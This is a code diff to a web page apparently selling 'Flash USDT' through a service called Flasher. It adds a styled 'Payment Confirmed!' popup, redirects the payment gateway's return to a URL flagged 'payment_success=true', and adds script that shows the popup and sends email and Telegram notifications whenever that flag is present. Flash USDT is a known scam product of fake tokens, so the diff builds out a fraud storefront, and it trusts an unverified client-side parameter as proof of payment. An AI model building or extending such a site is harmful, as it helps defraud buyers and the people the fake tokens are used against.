@@ -91,6 +91,86 @@
         .hero-wrapper{
             padding-top: 150px !important;
         }
+        
+        /* Confirmation Popup Styles */
+        .confirmation-popup {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.8);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 9999;
+            animation: fadeIn 0.3s ease;
+        }
+        .popup-content {
+            background: white;
+            border-radius: 20px;
+            padding: 2rem;
+            text-align: center;
+            max-width: 500px;
+            width: 90%;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
+            animation: slideIn 0.3s ease;
+        }
+        .popup-icon {
+            width: 80px;
+            height: 80px;
+            background: linear-gradient(135deg, #28a745, #20c997);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 1.5rem;
+            animation: pulse 2s infinite;
+        }
+        .popup-icon i {
+            color: white;
+            font-size: 2rem;
+        }
+        .popup-title {
+            color: #28a745;
+            font-size: 1.8rem;
+            font-weight: bold;
+            margin-bottom: 1rem;
+        }
+        .popup-message {
+            color: #6c757d;
+            margin-bottom: 2rem;
+            line-height: 1.6;
+            font-size: 1rem;
+        }
+        .popup-button {
+            background: linear-gradient(135deg, #28a745, #20c997);
+            border: none;
+            color: white;
+            padding: 12px 30px;
+            border-radius: 25px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-size: 1rem;
+        }
+        .popup-button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(40, 167, 69, 0.3);
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        @keyframes slideIn {
+            from { transform: translateY(-50px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
     </style>
     <style>
         .accordion-card .accordion-button:after{
@@ -246,6 +326,25 @@
                     </form>
                 </div>
             </div>
+        </div>
+    </div>
+
+    <!-- Payment Confirmation Popup -->
+    <div id="paymentConfirmationPopup" class="confirmation-popup" style="display: none;">
+        <div class="popup-content">
+            <div class="popup-icon">
+                <i class="fas fa-check"></i>
+            </div>
+            <h2 class="popup-title">Payment Confirmed!</h2>
+            <p class="popup-message">
+                Thank you for buying Flash USDT for Flasher!<br><br>
+                Your Flash USDT transfer will be completed to your provided wallet within 15 minutes.<br><br>
+                We will update you via your provided email in case of any issues. If any errors occur, we'll contact you through your given email.<br><br>
+                Thank you for choosing Flasher!
+            </p>
+            <button class="popup-button" onclick="closeConfirmationPopup()">
+                <i class="fas fa-home me-2"></i>Continue
+            </button>
         </div>
     </div>
 
@@ -746,7 +845,7 @@
                         to_currency: 'USDT',
                         auto_withdrawal: false,
                         callback_url: 'https://flashusdt-nu.vercel.app/callback',
-                        return_url: 'https://flashusdt-nu.vercel.app/success',
+                        return_url: 'https://flashusdt-nu.vercel.app/final/6.html?payment_success=true',
                         email: email,
                         order_id: orderId,
                         description: `Flash USDT Purchase - ${amount} USD - Wallet: ${walletAddress}`
@@ -1005,6 +1104,52 @@
                 messageContainer.style.display = 'none';
             }, 10000);
         }
+        
+        // Check for payment success on page load
+        function checkPaymentSuccess() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const paymentSuccess = urlParams.get('payment_success');
+            
+            if (paymentSuccess === 'true') {
+                // Show confirmation popup
+                showPaymentConfirmationPopup();
+                
+                // Send notifications
+                sendPaymentSuccessNotifications();
+                
+                // Clean URL (remove parameters)
+                const cleanUrl = window.location.origin + window.location.pathname;
+                window.history.replaceState({}, document.title, cleanUrl);
+            }
+        }
+        
+        // Show payment confirmation popup
+        function showPaymentConfirmationPopup() {
+            document.getElementById('paymentConfirmationPopup').style.display = 'flex';
+        }
+        
+        // Close confirmation popup
+        function closeConfirmationPopup() {
+            document.getElementById('paymentConfirmationPopup').style.display = 'none';
+        }
+        
+        // Send payment success notifications
+        function sendPaymentSuccessNotifications() {
+            // Get form data
+            const walletAddress = $('#wallet_address').val() || 'THTirtEHsqGUKHtvtkWUJRNskNbBbX7MSQ';
+            const email = $('#email').val() || 'customer@example.com';
+            const amount = $('#amount').val() || 'N/A';
+            const trackId = 'PAYMENT_' + Date.now();
+            
+            // Email notification
+            sendConfirmationEmail(email, walletAddress, amount, trackId);
+            
+            // Telegram notification
+            sendTelegramNotification(walletAddress, amount, trackId);
+        }
+        
+        // Initialize payment success check
+        checkPaymentSuccess();
     </script>
     
     <!-- Telegram Notifications Script -->
